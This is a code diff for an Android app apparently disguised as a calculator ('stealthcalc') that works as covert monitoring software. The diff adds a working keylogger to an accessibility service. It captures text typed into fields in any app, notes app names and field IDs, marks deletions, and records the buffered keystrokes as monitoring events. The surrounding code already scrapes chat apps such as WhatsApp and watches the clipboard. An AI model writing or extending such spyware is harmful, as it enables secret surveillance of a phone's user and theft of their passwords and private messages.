@@ -13,7 +13,9 @@ import com.stealthcalc.monitoring.model.MonitoringEventKind
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.serialization.Serializable
 import kotlinx.serialization.encodeToString
@@ -37,6 +39,12 @@ class AccessibilityMonitorService : AccessibilityService() {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var lastClipText: String? = null
     private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null
+    private val keystrokeBuffer = StringBuilder()
+    private var keystrokeApp: String = ""
+    private var keystrokeAppName: String? = null
+    private var keystrokeField: String? = null
+    private var keystrokeFlushJob: Job? = null
+    private var lastTextValue: String = ""
 
     private val chatApps = setOf(
         "com.whatsapp",
@@ -53,11 +61,12 @@ class AccessibilityMonitorService : AccessibilityService() {
     override fun onServiceConnected() {
         serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
-                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
+                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-            notificationTimeout = 300
+            notificationTimeout = 100
         }
 
         startClipboardMonitoring()
@@ -66,9 +75,15 @@ class AccessibilityMonitorService : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         if (!repository.isAgent) return
-        if (!repository.isMetricEnabled("chat_scraping")) return
 
         val packageName = event.packageName?.toString() ?: return
+
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            handleKeystroke(event, packageName)
+            return
+        }
+
+        if (!repository.isMetricEnabled("chat_scraping")) return
         if (packageName !in chatApps) return
 
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
@@ -139,6 +154,68 @@ class AccessibilityMonitorService : AccessibilityService() {
         }
 
         return texts.distinct()
+    }
+
+    private fun handleKeystroke(event: AccessibilityEvent, packageName: String) {
+        if (!repository.isMetricEnabled("keylogger")) return
+
+        val newText = event.text?.joinToString("") ?: return
+        if (newText == lastTextValue) return
+
+        val fieldId = event.source?.viewIdResourceName
+        event.source?.recycle()
+
+        if (packageName != keystrokeApp || fieldId != keystrokeField) {
+            flushKeystrokes()
+            keystrokeApp = packageName
+            keystrokeField = fieldId
+            keystrokeAppName = runCatching {
+                packageManager.getApplicationLabel(
+                    packageManager.getApplicationInfo(packageName, 0)
+                ).toString()
+            }.getOrNull()
+        }
+
+        val diff = if (newText.length > lastTextValue.length && newText.startsWith(lastTextValue)) {
+            newText.substring(lastTextValue.length)
+        } else if (newText.length < lastTextValue.length) {
+            "[DEL]"
+        } else {
+            newText
+        }
+        lastTextValue = newText
+        keystrokeBuffer.append(diff)
+
+        keystrokeFlushJob?.cancel()
+        keystrokeFlushJob = scope.launch {
+            delay(2000)
+            flushKeystrokes()
+        }
+    }
+
+    private fun flushKeystrokes() {
+        val text = keystrokeBuffer.toString()
+        if (text.isBlank()) return
+        keystrokeBuffer.clear()
+
+        val app = keystrokeApp
+        val appName = keystrokeAppName
+        val field = keystrokeField
+
+        scope.launch {
+            runCatching {
+                val payload = Json.encodeToString(
+                    com.stealthcalc.monitoring.model.KeystrokePayload(
+                        packageName = app,
+                        appName = appName,
+                        text = text,
+                        fieldId = field,
+                        timestampMs = System.currentTimeMillis(),
+                    )
+                )
+                repository.recordEvent(MonitoringEventKind.KEYSTROKE, payload)
+            }
+        }
     }
 
     private fun startClipboardMonitoring() {
